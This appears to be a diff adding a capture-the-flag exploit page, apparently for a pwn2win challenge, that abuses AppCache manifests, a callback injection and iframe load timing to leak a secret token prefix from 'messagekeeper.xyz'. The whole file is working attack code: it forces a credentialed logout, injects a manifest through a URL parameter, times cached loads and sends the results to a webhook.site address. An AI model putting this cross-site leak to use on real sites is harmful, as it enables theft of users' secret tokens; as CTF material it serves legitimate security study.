@@ -1,0 +1,71 @@
+<body></body>
+<script>
+
+const E = encodeURIComponent;
+
+const trial_token = 'Ai4ydiVubeyrG5ojmsmx4zXXRJHqir2J5uviVMDtaxxN4dythqlerla7pskdToaaKibhXDHG/ww1Gwt4keKDgAAAAABTeyJvcmlnaW4iOiJodHRwczovL21lc3NhZ2VrZWVwZXIueHl6OjQ0MyIsImZlYXR1cmUiOiJBcHBDYWNoZSIsImV4cGlyeSI6MTYzMzQ3ODM5OX0='
+
+const sleep = d => new Promise(r=>setTimeout(r,d));
+const prefix = (new URL(location.href)).searchParams.get('prefix');
+
+function load_manifest(token_prefix=''){
+    return new Promise(r=>{
+        const manifest = `CACHE MANIFEST
+/?cached
+
+FALLBACK:
+/user?token=${token_prefix} /static/background.png
+
+ORIGIN-TRIAL:
+${trial_token}
+#
+`
+        let iframe = document.createElement('iframe');
+        iframe.src = `https://messagekeeper.xyz/user?token=&callback=${E(`<html manifest="/user?token=&callback=${E(manifest)}"><head><meta http-equiv="origin-trial" content="${trial_token}"></head></html>`)}`
+        document.body.appendChild(iframe);
+        iframe.onload = r;
+    })
+}
+
+function measure_load(url){
+    return new Promise(r=>{
+        let iframe = document.createElement('iframe');
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        const start = performance.now();
+        iframe.onload = () => {
+            r((performance.now() - start).toFixed(0));
+        }
+        iframe.onerror = () => {console.log('error')}
+    })
+    
+
+}
+
+function logout(){
+    return fetch('https://messagekeeper.xyz/logout', {mode:'no-cors', credentials: 'include'});
+}
+
+async function start(){
+    await load_manifest(prefix || 'a');
+    // return;
+    await sleep(2000);
+
+    let measurements = ['prefix='+prefix];
+    // log out so /user returns 403 and FALLBACK triggers
+    await logout();
+    time = await measure_load("https://messagekeeper.xyz/?cached");
+    measurements.push(time)
+    time = await measure_load("https://messagekeeper.xyz/?cached");
+    measurements.push(time)
+    time = await measure_load("https://messagekeeper.xyz/?cached");
+    measurements.push(time)
+    navigator.sendBeacon('https://webhook.site/4547bd74-2f79-474f-ab02-3f51e9665ac8',measurements);
+}
+
+start();
+
+// See how to solve when most of the token is leaked here: 
+// https://terjanq.me/pwn2win/brute-token.html
+
+</script>
